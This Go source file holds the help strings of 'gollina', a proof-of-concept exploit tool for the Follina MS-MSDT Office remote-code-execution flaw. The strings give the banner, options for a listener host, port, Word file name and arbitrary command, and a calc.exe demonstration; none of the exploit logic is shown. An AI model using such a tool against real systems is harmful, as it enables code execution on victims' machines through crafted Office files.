package main

const (
  header = `
  gollina
  Follina MS-MSDT 0-day MS Office RCE PoC in Go
  --
  @dwisiswant0

`
  usage = `Usage:
  gollina -c [COMMAND] [OPTIONS...]

`
  opts = `Options:
  -h, --host        Listener host (default: 0.0.0.0)
  -p, --port        Listener port (default: 8090)
  -n, --name        Word file name (w/o extension, default: gollina)
  -c, --command     Arbitrary command to execute

`
  examples = `Examples:
  gollina -c "cmd.exe /c calc.exe"
  gollina -c "cmd.exe /c calc.exe" -p 8080

`
)
